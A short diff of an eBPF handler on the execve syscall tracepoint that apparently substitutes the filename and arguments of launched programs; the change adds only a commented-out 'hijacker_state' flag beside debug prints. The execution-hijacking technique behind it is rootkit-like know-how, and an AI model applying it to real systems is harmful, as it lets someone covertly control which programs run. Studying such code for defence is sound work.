@@ -198,6 +198,8 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
         bpf_printk("Error reading 1\n");
     };
 
+    //hijacker_state = 1;
+
     bpf_printk("SUCCESS NEW FILENAME: %s\n", newfilename);
     bpf_printk("NEW ARGV0: %s\n\n", newargv[0]);
     bpf_printk("NEW ARGV1: %s\n", newargv[1]);
